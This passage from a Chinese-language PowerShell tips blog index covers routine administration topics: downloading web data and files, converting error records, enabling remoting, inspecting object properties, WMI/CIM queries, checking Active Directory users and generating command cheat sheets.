这样的静态文本，然后取出之后的任何文本 ((.+))，直到结尾的静态文本 (&lt;/font)。$matches[1] 的值就是正则表达式中的第一个模式代表的内容，在这里就是我们要提取的借口。","link":"/2018/04/17/downloading-information-from-internet-part-3/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 4 部分）","text":"在前一个技能中我们介绍了如何使用 Invoke-WebRequest 从网页下载数据，例如从一个提供随机借口的网页中获取借口。然而，当您做测试的时候，有可能每次都获取到相同的借口（或数据）。 12345678910$url = 'http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl'$page = Invoke-WebRequest -Uri $url -UseBasicParsing$content = $page.Content$pattern = '(?s)&lt;br&gt;&lt;font size\\s?=\\s?&quot;\\+2&quot;&gt;(.+)&lt;/font'if ($page.Content -match $pattern){ $matches[1]} 最有可能的原因是处在一个代理服务器之后，代理服务器缓存了网站信息。要解决这个问题，只需要将 URL 加上一个类似这样的随机参数： 12345678910$url = &quot;http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl?$(Get-Random)&quot;$page = Invoke-WebRequest -Uri $url -UseBasicParsing$content = $page.Content$pattern = '(?s)&lt;br&gt;&lt;font size\\s?=\\s?&quot;\\+2&quot;&gt;(.+)&lt;/font'if ($page.Content -match $pattern){ $matches[1]}","link":"/2018/04/18/downloading-information-from-internet-part-4/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 5 部分）","text":"在前一个技能中我们演示了如何使用 Invoke-WebRequest 从网页下载 JSON 或 XML 数据。这个例子从 psconf.eu 下载 JSON 格式的议程表： 1$page = Invoke-WebRequest -Uri powershell.beer -UseBasicParsing $($page.Content | ConvertFrom-Json) | Out-GridView 这个例子下载 XML 格式的货币兑换率： 1$url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml'$result = Invoke-WebRequest -Uri $url -UseBasicParsing$xml = [xml]$result.Content$xml.Envelope.Cube.Cube.Cube 现在，有另一个名为 Invoke-RestMethod 的 cmdlet，专门设计来获取对象数据。基本上，它的工作方式和 Invoke-WebRequest 很接近，但是能够自动识别数据格式，并相应地转换它的类型。以下是用一行代码获取 psconf.eu 议程表的例子： 1$(Invoke-RestMethod -Uri powershell.beer -UseBasicParsing) | Out-GridView 这是轻松地获取货币兑换率的方法： 12$url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml'(Invoke-RestMethod -Uri $url -UseBasicParsing).Envelope.Cube.Cube.Cube","link":"/2018/04/19/downloading-information-from-internet-part-5/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 6 部分）","text":"在之前的技能中我们介绍了如何用 Invoke-WebRequest 或 Invoke-RestMethod 从网页获取 XML 数据。对于 XML 数据，还有一种用 XML 对象自身内建方法的处理方法 这是 Invoke-RestMethod 的使用方法： 12$url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml'(Invoke-RestMethod -Uri $url -UseBasicParsing).Envelope.Cube.Cube.Cube 作为另一种选择，请试试这种方法： 1234$url = 'http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml'$xml = New-Object -TypeName XML$xml.Load($url)$xml.Envelope.Cube.Cube.Cube 这种方法快得多。不过它没有提供 Invoke-RestMethod 中的多个参数来处理代理服务器和凭据。","link":"/2018/04/20/downloading-information-from-internet-part-6/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 7 部分）","text":"在这个迷你系列中的该部分，我们将演示如何用 Invoke-WebRequest 从 internet 下载文件。只需要用 -OutFile 参数。这段代码下载 PNG 格式的 PowerShell 图标到桌面上： 12345$url = &quot;http://www.dotnet-lexikon.de/grafik/Lexikon/Windowspowershell.png&quot;$destination = &quot;$home\\powershell.png&quot;Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsingInvoke-Item -Path $destination 请注意 Invoke-WebRequest 只能从 HTTP 地址下载文件。如果从 HTTPS 地址下载将会报错。请查看我们的下一个技能如何解决它！","link":"/2018/04/23/downloading-information-from-internet-part-7/"},{"title":"PowerShell 技能连载 - 从 Internet 下载信息（第 8 部分）","text":"在之前的技能中我们演示如何用 Invoke-WebRequest 从 internet 下载文件。然而，它只适用于 HTTP 地址。如果您用的是 HTTPS 地址，将会失败： 12345$url = &quot;https://github.com/PowerShellConferenceEU/2018/raw/master/Agenda_psconfeu_2018.pdf&quot;$destination = &quot;$home\\agenda.pdf&quot;Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsingInvoke-Item -Path $destination 一个简单的解决方法是先运行这行代码： 1[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 执行完这行代码之后，之前的代码就运行正常了，可以下载 psconf.eu PDF 格式的议程表到您的桌面上，然后尝试打开该文件。","link":"/2018/04/24/downloading-information-from-internet-part-8/"},{"title":"PowerShell 技能连载 - 转换错误记录","text":"当 PowerShell 抛出错误时，会向 $error 写入一条错误记录，它是一个存储最后发生的错误的数组。 您可以尝试从 ErrorRecord 对象手工解出相关的错误信息，或者使用以下函数： 123456789101112131415161718192021222324252627282930313233function ConvertFrom-ErrorRecord{ [CmdletBinding(DefaultParameterSetName=&quot;ErrorRecord&quot;)] param ( [Management.Automation.ErrorRecord] [Parameter(Mandatory,ValueFromPipeline,ParameterSetName=&quot;ErrorRecord&quot;, Position=0)] $Record, [Object] [Parameter(Mandatory,ValueFromPipeline,ParameterSetName=&quot;Unknown&quot;, Position=0)] $Alien ) process { if ($PSCmdlet.ParameterSetName -eq 'ErrorRecord') { [PSCustomObject]@{ Exception = $Record.Exception.Message Reason = $Record.CategoryInfo.Reason Target = $Record.CategoryInfo.TargetName Script = $Record.InvocationInfo.ScriptName Line = $Record.InvocationInfo.ScriptLineNumber Column = $Record.InvocationInfo.OffsetInLine } } else { Write-Warning &quot;$Alien&quot; } }} 这个函数有两个参数集，一个合法的 ErrorRecord 对象自动绑定到 $Record 参数。如果遇到一个不同类型的，无法被这个函数处理的对象，那么它将绑定到 $Alien。 要查看详细的错误信息，请试试这行代码： 1PS&gt; $error | ConvertFrom-ErrorRecord | Out-GridView","link":"/2018/04/25/converting-error-records/"},{"title":"PowerShell 技能连载 - 在 try&#x2F;catch 中使用 ConvertFrom-ErrorRecord","text":"在前一个技能中我们创建了一个名为 ConvertFrom-ErrorRecord 的函数，它能方便地从 PowerShell 的 ErrorRecord 对象中方便地获取错误信息。 您也可以在 catch 块中使用这个函数。只需要先运行以下函数即可： 123456789101112131415161718192021222324252627282930313233function ConvertFrom-ErrorRecord{ [CmdletBinding(DefaultParameterSetName=&quot;ErrorRecord&quot;)] param ( [Management.Automation.ErrorRecord] [Parameter(Mandatory,ValueFromPipeline,ParameterSetName=&quot;ErrorRecord&quot;, Position=0)] $Record, [Object] [Parameter(Mandatory,ValueFromPipeline,ParameterSetName=&quot;Unknown&quot;, Position=0)] $Alien ) process { if ($PSCmdlet.ParameterSetName -eq 'ErrorRecord') { [PSCustomObject]@{ Exception = $Record.Exception.Message Reason = $Record.CategoryInfo.Reason Target = $Record.CategoryInfo.TargetName Script = $Record.InvocationInfo.ScriptName Line = $Record.InvocationInfo.ScriptLineNumber Column = $Record.InvocationInfo.OffsetInLine } } else { Write-Warning &quot;$Alien&quot; } }} 以下是如何在 catch 代码块中使用 ConvertFrom-ErrorRecord 的例子： 1234567891011121314try{ # this raises an error Get-Service -Name NonExisting -ErrorAction Stop}catch{ # pipe the errorrecord object through the new function # to retrieve all relevant error information # which you then could use to do error logging, or output # custom error messages $_ | ConvertFrom-ErrorRecord}","link":"/2018/04/26/using-convertfrom-errorrecord-in-try-catch/"},{"title":"PowerShell 技能连载 - 允许远程处理","text":"cmdlet 有许多方法可以从另一台计算机远程获取信息。以下只是其中的一些方法： 12345678910# try and connect to this computer# (adjust it to a valid name in your network)$destinationServer = &quot;SERVER12&quot;# PowerShell remoting$result1 = Invoke-Command { Get-Service } -ComputerName $destinationServer# built-in$result2 = Get-Service -ComputerName $destinationServer$result3 = Get-Process -ComputerName $destinationServer 非常可能的情况是，缺省情况下远程访问不可用。受限，对于许多远程技术您需要目标端的管理员权限。但是即便您拥有该权限，客户操作系统的远程访问缺省情况下也是禁用的。 如果您希望在测试机上打开最常用的远程技术，请在用管理员权限打开的 PowerShell 中运行以下代码： 12netsh firewall set service remoteadmin enableEnable-PSRemoting -SkipNetworkProfileCheck -Force 虽然第一条命令是已过时的，但仍然有效。它将管理员远程功能添加到防火墙例外中，允许基于 DCOM 的远程处理。第二行启用 PowerShell 远程处理。","link":"/2018/04/27/enabling-remoting/"},{"title":"PowerShell 技能连载 - 列出属性和值（第 1 部分）","text":"对象中有丰富的信息，但是对象也可能有空的属性。尤其是从 Active Directory 中获取的对象。 以下是一个名为 Remove-EmptyProperty 的有用的函数，能够接受任意的对象并移除所有空属性： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# Only list output fields with contentfunction Remove-EmptyProperty { param ( [Parameter(Mandatory,ValueFromPipeline)] $InputObject, [Switch] $AsHashTable ) begin { $props = @() } process { if ($props.COunt -eq 0) { $props = $InputObject | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name } $notEmpty = $props | Where-Object { !($InputObject.$_ -eq $null -or $InputObject.$_ -eq '' -or $InputObject.$_.Count -eq 0) | Sort-Object } if ($AsHashTable) { $notEmpty | ForEach-Object { $h = [Ordered]@{}} { $h.$_ = $InputObject.$_ } { $h } } else { $InputObject | Select-Object -Property $notEmpty } }} 以下是一个例子，演示如何使用该函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475PS&gt; Get-Process -Id $pidHandles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName------- ------ ----- ----- ------ -- -- ----------- 1432 87 324452 346012 145,13 14340 1 powershell_isePS&gt; Get-Process -Id $pid | Remove-EmptyPropertyHandles : 1256Name : powershell_iseNPM : 85320PM : 332496896SI : 1VM : 1491988480WS : 363655168__NounName : ProcessBasePriority : 8Handle : 5776HandleCount : 1256Id : 14340MachineName : .MainModule : System.Diagnostics.ProcessModule (PowerShell_ISE.exe)MainWindowHandle : 10033714MainWindowTitle : C:\\Users\\tobweMaxWorkingSet : 1413120MinWorkingSet : 204800Modules : {System.Diagnostics.ProcessModule (PowerShell_ISE.exe), System.Diagnostics.ProcessModule (ntdll.dll), System.Diagnostics.ProcessModule (MSCOREE.DLL), System.Diagnostics.ProcessModule (KERNEL32.dll)...}NonpagedSystemMemorySize : 85320NonpagedSystemMemorySize64 : 85320PagedMemorySize : 332496896PagedMemorySize64 : 332496896PagedSystemMemorySize : 1272400PagedSystemMemorySize64 : 1272400PeakPagedMemorySize : 389857280PeakPagedMemorySize64 : 389857280PeakVirtualMemorySize : 1601478656PeakVirtualMemorySize64 : 1601478656PeakWorkingSet : 423972864PeakWorkingSet64 : 423972864PriorityBoostEnabled : TruePriorityClass : NormalPrivateMemorySize : 332496896PrivateMemorySize64 : 332496896PrivilegedProcessorTime : 00:00:30.6250000ProcessName : powershell_iseProcessorAffinity : 15Responding : TrueSafeHandle : Microsoft.Win32.SafeHandles.SafeProcessHandleSessionId : 1StartInfo : System.Diagnostics.ProcessStartInfoStartTime : 04.04.2018 08:55:57Threads : {16712, 12844, 15764, 1992...}TotalProcessorTime : 00:02:26.2656250UserProcessorTime : 00:01:55.6406250VirtualMemorySize : 1491988480VirtualMemorySize64 : 1491988480WorkingSet : 363655168WorkingSet64 : 363655168Company : Microsoft CorporationCPU : 146,265625Description : Windows PowerShell ISEFileVersion : 10.0.16299.15 (WinBuild.160101.0800)Path : C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exeProduct : Microsoft® Windows® Operating SystemProductVersion : 10.0.16299.15PS&gt; Remove-EmptyProperty 基本上是创建一个只包含实际值的属性。由于它总是创建一个新对象，所以它有副作用：您总是会看到缺省情况下隐藏的属性。","link":"/2018/04/30/listing-properties-with-values-part-1/"},{"title":"PowerShell 技能连载 - 列出属性和值（第 2 部分）","text":"在前一个技能中我们介绍了一个名为 Remove-EmptyProperty 的新函数，它能够移除所有没有值的属性。现在让我们将它扩展一点，使它的对象属性按字母顺序排序： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# Only list output fields with contentfunction Remove-EmptyProperty { param ( [Parameter(Mandatory,ValueFromPipeline)] $InputObject, [Switch] $AsHashTable ) begin { $props = @() } process { if ($props.COunt -eq 0) { $props = $InputObject | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | Sort-Object } $notEmpty = $props | Where-Object { !($InputObject.$_ -eq $null -or $InputObject.$_ -eq '' -or $InputObject.$_.Count -eq 0) | Sort-Object } if ($AsHashTable) { $notEmpty | ForEach-Object { $h = [Ordered]@{}} { $h.$_ = $InputObject.$_ } { $h } } else { $InputObject | Select-Object -Property $notEmpty } }} 当运行它以后，所有属性将会按字母顺序排序，这样要查找一个特定的属性变得十分容易： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162PS&gt; Get-Process -Id $pid | Remove-EmptyProperty__NounName : ProcessBasePriority : 8Company : Microsoft CorporationCPU : 162,953125Description : Windows PowerShell ISEFileVersion : 10.0.16299.15 (WinBuild.160101.0800)Handle : 5708HandleCount : 1345Handles : 1345Id : 14340MachineName : .MainModule : System.Diagnostics.ProcessModule (PowerShell_ISE.exe)MainWindowHandle : 10033714MainWindowTitle : C:\\Users\\tobweMaxWorkingSet : 1413120MinWorkingSet : 204800Modules : {System.Diagnostics.ProcessModule (PowerShell_ISE.exe), System.Diagnostics.ProcessModule (ntdll.dll), System.Diagnostics.ProcessModule (MSCOREE.DLL), System.Diagnostics.ProcessModule (KERNEL32.dll)...}Name : powershell_iseNonpagedSystemMemorySize : 86544NonpagedSystemMemorySize64 : 86544NPM : 86544PagedMemorySize : 335093760PagedMemorySize64 : 335093760PagedSystemMemorySize : 1277432PagedSystemMemorySize64 : 1277432Path : C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exePeakPagedMemorySize : 389857280PeakPagedMemorySize64 : 389857280PeakVirtualMemorySize : 1601478656PeakVirtualMemorySize64 : 1601478656PeakWorkingSet : 423972864PeakWorkingSet64 : 423972864PM : 335093760PriorityBoostEnabled : TruePriorityClass : NormalPrivateMemorySize : 335093760PrivateMemorySize64 : 335093760PrivilegedProcessorTime : 00:00:34.2187500ProcessName : powershell_iseProcessorAffinity : 15Product : Microsoft® Windows® Operating SystemProductVersion : 10.0.16299.15Responding : TrueSafeHandle : Microsoft.Win32.SafeHandles.SafeProcessHandleSessionId : 1SI : 1StartInfo : System.Diagnostics.ProcessStartInfoStartTime : 04.04.2018 08:55:57Threads : {16712, 12844, 15764, 1992...}TotalProcessorTime : 00:02:42.9531250UserProcessorTime : 00:02:08.7343750VirtualMemorySize : 1485922304VirtualMemorySize64 : 1485922304VM : 1485922304WorkingSet : 354381824WorkingSet64 : 354381824WS : 354381824","link":"/2018/05/01/listing-properties-with-values-part-2/"},{"title":"PowerShell 技能连载 - 列出属性和值（第 3 部分）","text":"当您希望检查单个对象和它的属性时，将对象用管道输出到 Out-GridView 指令不是太方便：网格视图窗口显示一个（非常长的）单行属性。试试这行代码，自己体验一下： 1PS&gt; Get-Process -Id $pid | Select-Object -Property * | Out-GridView 我们之前用过以下函数来对所有没有值的属性排序。但是这个函数还能做更多的事。他支持 -AsHashtable 参数，能将一个对象转换为哈希表，可以有效地帮助您显示单个对象的详细内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# Only list output fields with contentfunction Remove-EmptyProperty { param ( [Parameter(Mandatory,ValueFromPipeline)] $InputObject, [Switch] $AsHashTable ) begin { $props = @() } process { if ($props.COunt -eq 0) { $props = $InputObject | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | Sort-Object } $notEmpty = $props | Where-Object { !($InputObject.$_ -eq $null -or $InputObject.$_ -eq '' -or $InputObject.$_.Count -eq 0) | Sort-Object } if ($AsHashTable) { $notEmpty | ForEach-Object { $h = [Ordered]@{}} { $h.$_ = $InputObject.$_ } { $h } } else { $InputObject | Select-Object -Property $notEmpty } }} 当指定了 -AsHashtable 以后，Out-GridView 纵向显示对象内容，而不是水平显示。而且由于它叶移除了所有空白属性并按字母顺序对属性排序，它变得更容易查看和检视对象： 1PS&gt; Get-Process -Id $pid | Select-Object -Property * | Remove-EmptyProperty -AsHashTable | Out-GridView 例如把它用在 AD 用户对象上： 1PS&gt; Get-ADUser $env:username -Properties * | Remove-EmptyProperty -AsHashTable | Out-GridView","link":"/2018/05/02/listing-properties-with-values-part-3/"},{"title":"PowerShell 技能连载 - WMI 快速入门（第 1 部分）","text":"WMI 是管理员的一个有用的信息源。您所需要的知识 WMI 类的名字，它代表了您感兴趣的东西。查找合法的 WMI 类名的最简单方法是搜索。 这行代码返回所有名字中包含 “Share” 的类： 1Get-WmiObject -Class *share* -List 下一步，用 Get-WmiObject 获取一个类的所有实例： 1Get-WmiObject -Class win32_share 如果您想查看所有属性，请别忘了将结果通过管道输出到 Select-Object 指令： 1Get-WmiObject -Class win32_share | Select-Object -Property * 一个更好的方法是使用 Get-CimInstance 而不是 Get-WmiObject 因为它能自动转换数据类型，例如 DateTime。 这个调用和 Get-WmiObject 的效果基本相同： 1Get-CimInstance -ClassName Win32_Share 现在，您可以看到其中的区别： 12345Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -Property Name, LastBootupTime, OSTypeGet-WmiObject -Class Win32_OperatingSystem | Select-Object -Property Name, LastBootupTime, OSType","link":"/2018/05/03/wmi-quick-primer-part-1/"},{"title":"PowerShell 技能连载 - WMI 快速入门（第 2 部分）","text":"有两个 cmdlet 可以获取 WMI 数据：旧的 Get-WmiObject cmdlet 和新的 Get-CimInstance cmdlet。当在本地使用时，两者的行为十分相像。然而当远程使用的时候，两者的区别十分明显。 以下是两个示例调用，分别从远程系统中获取共享的文件（请确保调整了计算机名）： 12Get-WmiObject -Class Win32_Share -ComputerName sr0710Get-CimInstance -ClassName Win32_Share -ComputerName sr0710 （两个调用都需要目标计算机的本地的管理员权限，所以您可能需要添加 Credential 参数并且提交一个合法的账户名，如果您当前的用户不满足这些要求的话） Get-WmiObject 总是使用 DCOM 做为传输协议，而 Get-CimInstance 使用 WSMAN（一种 WebService 类的通信协议）。多数主流的 Windows 操作系统支持 WSMan，但如果您需要和旧的服务器通信，它们可能只支持 DCOM，这样 Get-CimInstance 可能会失败。 Get-CimInstance 可以使用 session 参数，这提供了巨大的灵活性，而且运行您选择传输协议。要使用 DCOM（类似 Get-WmiObject），请使用以下代码： 1234$options = New-CimSessionOption -Protocol Dcom$session = New-CimSession -ComputerName sr0710 -SessionOption $options$sh = Get-CimInstance -ClassName Win32_Share -CimSession $sessionRemove-CimSession -CimSession $session","link":"/2018/05/04/wmi-quick-primer-part-2/"},{"title":"PowerShell 技能连载 - WMI 快速入门（第 3 部分）","text":"在前一个技能中我们解释了为什么 Get-CimInstance 比旧的 Get-WmiObject cmdlet 有优势。 这是另一个例子，演示了为什么 Get-CimInstance 可能会比 Get-WmiObject 快得多。 当您需要从远程主机查询多个 WMI 类，例如您需要创建一个库存报告，每次运行 cmdlet 时 Get-WmiObject 需要连接和断开连接。然而 Get-CimInstance 可以复用已有的 session。 以下是一个演示如何在两个查询中复用同一个 session 的例子： 12345678910# create the session$options = New-CimSessionOption -Protocol Wsman$session = New-CimSession -ComputerName sr0710 -SessionOption $options# reuse the session for as many queries as you like$sh = Get-CimInstance -ClassName Win32_Share -CimSession $session -Filter 'Name=&quot;Admin$&quot;'$se = Get-CimInstance -ClassName Win32_Service -CimSession $session# remove the session at the endRemove-CimSession -CimSession $session 当您需要连接到不支持 WSMan 的旧的计算机，只需要将以上代码的协议改为 DCOM 即可：将 Wsman 替换为 Dcom。","link":"/2018/05/07/wmi-quick-primer-part-3/"},{"title":"PowerShell 技能连载 - WMI 快速入门（第 4 部分）","text":"通常，WMI 对象有许多包含重要信息的属性。这行代码将获取所有运行中的记事本实例的所有信息（请先运行记事本）： 1234567Get-WmiObject -Class Win32_Process -Filter 'Name LIKE &quot;%notepad%&quot;'···类似的，这行代码用 `Get-CimInstance` 获取相同的信息：```powershellGet-CimInstance -Class Win32_Process -Filter 'Name LIKE &quot;%notepad%&quot;' 有些时候，WMI 对象也包含方法。获取方法名最简单的方法是用 Get-WmiObject，然后将结果通过管道传送给 Get-Member 命令： 123456789101112131415PS&gt; Get-WmiObject -Class Win32_Process -Filter 'Name LIKE &quot;%notepad%&quot;' | Get-Member -MemberType *method TypeName: System.Management.ManagementObject#root\\cimv2\\Win32_ProcessName MemberType Definition---- ---------- ----------AttachDebugger Method System.Management.ManagementBaseObject AttachDebugger()GetAvailableVirtualSize Method System.Management.ManagementBaseObject GetAvailableVirtualSize()GetOwner Method System.Management.ManagementBaseObject GetOwner()GetOwnerSid Method System.Management.ManagementBaseObject GetOwnerSid()SetPriority Method System.Management.ManagementBaseObject SetPriority(System.Int32 Priority)Terminate Method System.Management.ManagementBaseObject Terminate(System.UInt32 Reason)ConvertFromDateTime ScriptMethod System.Object ConvertFromDateTime();ConvertToDateTime ScriptMethod System.Object ConvertToDateTime(); 要调用一个方法，例如获取一个进程的所有者时，Get-WmiObject 和 Get-CimInstance 之间有一个基本的区别： 当您通过 Get-WmiObject 获取对象时，对象的方法是返回对象的一部分： 1234$notepads = Get-WmiObject -Class Win32_Process -Filter 'Name LIKE &quot;%notepad%&quot;'$notepads | ForEach-Object { $notepads.GetOwner()} 通过 Get-CimInstance 返回的对象不包含 WMI 方法。要调用 WMI 方法，您需要调用 Invoke-CimMethod： 12345$notepads = Get-CimInstance -Class Win32_Process -Filter 'Name LIKE &quot;%notepad%&quot;'$notepads | ForEach-Object { Invoke-CimMethod -InputObject $_ -MethodName &quot;GetOwner&quot; } 在以上的代码中，假设您移除 GetOwner，而是按下 CTRL + SPACE 键调出智能感知（或在简单 PowerShell 控制台中按 TAB 键），您可以获得所有可用的方法名称。如果一个方法需要参数，请使用 -Arguments 参数。","link":"/2018/05/08/wmi-quick-primer-part-4/"},{"title":"PowerShell 技能连载 - 测试 AD 用户是否存在","text":"如果您需要查看一个指定的域用户是否存在，并且假设您已经安装了 ActiveDirectory PowerShell 模块，它是 RSAT（远程服务器管理工具）的一部分，那么有一个更巧的方法： 123456789101112function Test-UserExists{ param ( [Parameter(Mandatory)] [string] $SAMAccountName ) @(Get-ADUser -LDAPFilter &quot;(samaccountname=$SAMAccountName)&quot;).Count -ne 0} 您也可以调整 LDAP 查询来基于其它属性检查用户。","link":"/2018/05/09/test-ad-user-exists/"},{"title":"PowerShell 技能连载 - 通过 Windows 10 开始菜单快速打开 PowerShell","text":"在 Windows 10 中，PowerShell 可以通过 WIN + X 键（或右键单击开始菜单图标）启动。如果您的 Windows 10 打开的是过时的 cmd.exe，那么该快速做出改变了。 单击开始菜单图标（或按 WIN 键）。在开始菜单中，单击“齿轮”图标打开 Windows 设置。您现在可以看到一个有许多图标的，名为“Windows 设置”的窗口，在顶部有一个叫做“查找设置”的文本框。在文本框中输入 “PowerShell” 即可打开“使用 Windows + X 菜单时，将命令提示符替换为 Windows PowerShell”。","link":"/2018/05/10/quickly-open-powershell-via-windows-10-start-menu/"},{"title":"PowerShell 技能连载 - 创建 PowerShell 命令速查表（第 1 部分）","text":"以下是一个创建您喜爱的 PowerShell 命令的速查表的的技巧。 所有 PowerShell 命令都是随着模块分发，所以如果您认为某个 PowerShell 对您有用，您可能希望列出模块中其它（可能相关）的命令。这行代码显示如何查找任何指定命令的模块名，并列出包含 Get-WmiObject 命令的模块名： 123PS&gt;PS&gt; (Get-Command -Name Get-WmiObject).ModuleNameMicrosoft.PowerShell.Management 要查看这个模块所有其它命令，请试试这段代码： 123456789101112PS&gt; Get-Command -Module Microsoft.PowerShell.ManagementCommandType Name Version----------- ---- -------Cmdlet Add-Computer 3.1.0.0Cmdlet Add-Content 3.1.0.0Cmdlet Checkpoint-Computer 3.1.0.0Cmdlet Clear-Content 3.1.0.0Cmdlet Clear-EventLog 3.1.0.0Cmdlet Clear-Item 3.1.0.0Cmdlet Clear-ItemProperty 3.1.0.0Cmdlet Clear-RecycleBin 3.1.0.0 要创建一个包含命令名和描述的便利的速查表，请将命令通过管道导出到 Get-Help 命令，然后使用 Select-Object 从帮助中选择详细信息，加入您的速查表： 12345678910111213141516171819202122232425262728293031PS&gt; Get-Command -Module Microsoft.PowerShell.Management | Get-Help | Select-Object -Property Name, SynopsisName Synopsis---- --------Add-Computer Add the local computer to a domain or workgroup.Add-Content Adds content to the specified items, such as adding word...Checkpoint-Computer Creates a system restore point on the local computer.Clear-Content Deletes the contents of an item, but does not delete the...Clear-EventLog Clears all entries from specified event logs on the loca...Clear-Item Clears the contents of an item, but does not delete the ...Clear-ItemProperty Clears the value of a property but does not delete the p...Clear-RecycleBinComplete-Transac... Commits the active transaction.Convert-Path Converts a path from a Windows PowerShell path to a Wind...Copy-Item Copies an item from one location to another.Copy-ItemProperty Copies a property and value from a specified location to...Debug-Process Debugs one or more processes running on the local computer.Disable-Computer... Disables the System Restore feature on the specified fil...Enable-ComputerR... Enables the System Restore feature on the specified file...Get-ChildItem Gets the items and child items in one or more specified ...Get-Clipboard Gets the current Windows clipboard entry.Get-ComputerInfo Gets a consolidated object of system and operating syste...Get-ComputerRest... Gets the restore points on the local computer.Get-Content Gets the content of the item at the specified location.Get-ControlPanel... Gets control panel items.Get-EventLog Gets the events in an event log, or a list of the event ...Get-HotFix Gets the hotfixes that have been applied to the local an...Get-Item Gets the item at the specified location.Get-ItemProperty Gets the properties of a specified item.Get-ItemProperty... Gets the value for one or more properties of a specified...Get-Location Gets information about the current working location or a... 如果帮助信息不完整，并且没有选择的命令没有提要信息，那么您可能首先需要下载 PowerShell 帮助。要下载帮助，首先需要一个提升权限的 PowerShell： 1PS&gt; Update-Help -UICulture en-us -Force 不要担心这条命令抛出的错误信息：它对于一小部分没有提供帮助信息的模块是正常的。如果您收到一大堆错误信息，那么您可能没有在提升权限的 PowerShell 中执行命令。不幸的是，PowerShell 存储帮助文件的位置和模块的位置不同，普通用户不可存存储取帮助文件的位置。","link":"/2018/05/11/creating-powershell-command-cheat-sheets-part-1/"},{"title":"PowerShell 技能连载 - 创建 PowerShell 命令速查表（第 2 部分）","text":"在前一个技能中，我们创建了 PowerShell 命令的速查表，在此提醒，这行代码将会创建网络命令的速查表（假设您有存取本例中 NetAdapter 模块的权限）： 1234567891011121314151617181920212223242526272829303132333435363738PS&gt; Get-Command -Module NetAdapter | Get-Help | Select-Object -Property Name, SynopsisName Synopsis---- --------Disable-NetAdapter Disables a network adapter.Disable-NetAdapterBinding Disables a binding to a netw...Disable-NetAdapterChecksumOffload Disables the selected checks...Disable-NetAdapterEncapsulatedPacketTaskOffload Disables encapsulated packet...Disable-NetAdapterIPsecOffload Disables IPsec offload on th...Disable-NetAdapterLso Disables all LSO properties,...Disable-NetAdapterPacketDirect ...Disable-NetAdapterPowerManagement Disables specific power mana...Disable-NetAdapterQos Disables QoS on a network ad...Disable-NetAdapterRdma Disables RDMA on a network a...Disable-NetAdapterRsc Disables RSC on a network ad...Disable-NetAdapterRss Disables RSS on a network ad...Disable-NetAdapterSriov Disables SR-IOV on a network...Disable-NetAdapterVmq Disables the VMQ feature on ...Enable-NetAdapter Enables a network adapter.Enable-NetAdapterBinding Enables binding of a protoco...Enable-NetAdapterChecksumOffload Enables checksum offloads on...Enable-NetAdapterEncapsulatedPacketTaskOffload Enables encapsulated packet ...Enable-NetAdapterIPsecOffload Enables IPsec offload on the...Enable-NetAdapterLso Enables LSO properties, such...Enable-NetAdapterPacketDirect ...Enable-NetAdapterPowerManagement Enables specific power manag...Enable-NetAdapterQos Enables QoS on the network a...Enable-NetAdapterRdma Enables RDMA on a network ad...Enable-NetAdapterRsc Enables RSC on a network ada...Enable-NetAdapterRss Enables RSS on a network ada...Enable-NetAdapterSriov Enables SR-IOV on a network ...Enable-NetAdapterVmq Enables VMQ on a network ada...Get-NetAdapter Gets the basic network adapt...Get-NetAdapterAdvancedProperty Gets the advanced properties...Get-NetAdapterBinding Gets a list of bindings for ...Get-NetAdapterChecksumOffload Gets the various checksum of...Get-NetAdapterEncapsulatedPacketTaskOffload Gets the network adapters th...... 要让这个列表更有价值，让我们将它转换为 HTML 表格，这样您可以在浏览器中打开，并且打印： 123456789101112$ModuleName = &quot;NetAdapter&quot;$OutFile = &quot;$env:temp\\commands.html&quot;Get-Command -Module $moduleName | Get-Help | Select-Object -Property Name, Synopsis | ConvertTo-Html | Set-Content -Path $OutFileInvoke-Item -Path $OutFile 运行这段代码后，几秒钟后您的缺省 WEB 浏览器将会打开一个包含速查表信息的页面。现在可以用浏览器的命令来打印它。这个页面不是十分美观，但满足了它的需求。","link":"/2018/05/14/creating-powershell-command-cheat-sheets-part-2/"},{"title":"PowerShell 技能连载 - 创建 PowerShell 命令速查表（第 3 部分）","text":"在前一个技能中，我们创建了 PowerShell 命令的速查表并且将他们转换为可被浏览器打开和打印的 HTML 报告。它可以正常工作，但是输出页面不是非常精致。只要加上一些 HTML 延时，您的命令列表就可以上黄金档啦，而且您还可以用这个例子中的技术来“美化”任何通过 PowerShell 的 ConvertTo-Html 创建的 HTML 表格： 123456789101112131415161718192021222324252627# adjust the name of the module# code will list all commands shipped by that module# list of all modules: Get-Module -ListAvailable$ModuleName = &quot;PrintManagement&quot;$Title = &quot;PowerShell Print Management Commands&quot;$OutFile = &quot;$env:temp\\commands.html&quot;$StyleSheet = @&quot;&lt;title&gt;$Title&lt;/title&gt;&lt;style&gt;h1, th { text-align: center; font-family: Segoe UI; color:#0046c3;}table { margin: auto; font-family: Segoe UI; box-shadow: 10px 10px 5px #888; border: thin ridge grey; }th { background: 